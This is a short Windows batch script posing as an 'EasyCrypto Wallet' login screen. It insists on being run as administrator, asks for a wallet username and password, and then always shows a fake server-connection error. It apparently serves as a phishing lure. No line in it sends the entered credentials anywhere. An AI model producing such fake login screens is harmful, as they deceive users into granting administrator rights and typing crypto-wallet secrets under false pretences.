@echo off
chcp 65001 >nul
title EasyCrypto Wallet
color A
cls

echo  ╔════════════════════════════════════════════════════════════╗
echo  ║                  EasyCrypto Wallet Login                   ║
echo  ╚════════════════════════════════════════════════════════════╝
echo.

rem Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Checking for admin privileges...
    timeout /t 4 >nul
    echo.
    color C
    echo  ╔════════════════════════════════════════════════════════╗
    echo  ║ [!] Admin privileges required to run EasyCrypto Wallet.║
    echo  ║ Please right-click and select "Run as administrator."  ║
    echo  ╚════════════════════════════════════════════════════════╝
    echo.
    pause
    exit /b
)

set /p user=Enter wallet username: 
set /p pass=Enter wallet password: 

echo.
echo Authenticating...
timeout /t 2 >nul

echo.
color C
echo  ╔════════════════════════════════════════════════════════╗
echo  ║ [!] Error: Unable to connect to EasyCrypto server.     ║
echo  ║ Please try again later.                                ║
echo  ╚════════════════════════════════════════════════════════╝
echo.
pause
exit /b